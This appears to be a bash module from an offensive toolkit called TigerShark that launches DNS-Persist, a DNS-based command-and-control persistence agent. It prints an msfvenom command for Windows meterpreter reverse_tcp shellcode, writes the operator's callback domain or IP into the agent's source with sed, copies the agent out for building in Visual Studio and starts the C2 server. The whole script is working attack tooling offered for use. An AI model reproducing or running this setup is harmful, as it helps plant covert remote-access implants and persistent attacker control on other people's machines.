#!/bin/bash
ORNG='\033[0;33m'
NC='\033[0m'
W='\033[1;37m'
LP='\033[1;35m'
YLW='\033[1;33m'
LBBLUE='\e[104m'

echo -e "${ORNG}"
figlet -f mini "Dns-Persist"
echo -e "${NC}"
cd tools/DNS-Persist
echo -e "${W}Do you have a ${RED}build${W} agent or do you need to ${YLW}configure${W} agent options? (${RED}b${W}/${YLW}c${W})${NC}"
echo -e "${W}You will need to generate shellcode using msfvenom${NC}\n"
echo -e "${RED}eg. ${ORNG}msfvenom -p windows/meterpreter/reverse_tcp LHOST=ip LPORT=port EXITFUNC=thread -b \"\x00\" -f hex -o ${LBBLUE}path/to/payload/output.txt${NC}\n"
echo -e "${YLW}Please enter your command to generate the shellcode, like the example above${NC}"
echo -e "${W}Please enter the domain/IP for DNS callback${NC}"
read IP
sudo cp /opt/DNS-Persist/Agent/Agent/Declarations.h /opt/DNS-Persist/Agent/Agent/Declarations_orig.h 
sed -i "s/example.com/${IP}/g" /opt/DNS-Persist/Agent/Agent/Declarations.h
sudo cp -r /opt/DNS-Persist/Agent -t /home/$USER/Desktop
sudo mv /opt/DNS-Persist/Agent/Agent/Declarations_orig.h /opt/DNS-Persist/Agent/Agent/Declarations.h
echo -e "${YLW}The agents folder has been copied to your Desktop\nNow you need to build the Agent executable using Visual Studio${NC}"
echo -e "${LP}When you are ready and your agent has been built, hit ${LBBLUE}enter${NC}\n${YLW}If you would like to build the payload for later please enter ${RED}q${NC}"
read RUNTIME
if [[ ${RUNTIME} == "q" ]]; then
	echo -e "${W}Please build your payload and once your ready please run this module again${NC}"
else
	sudo python server.py
fi
cd /opt/TigerShark
./tigershark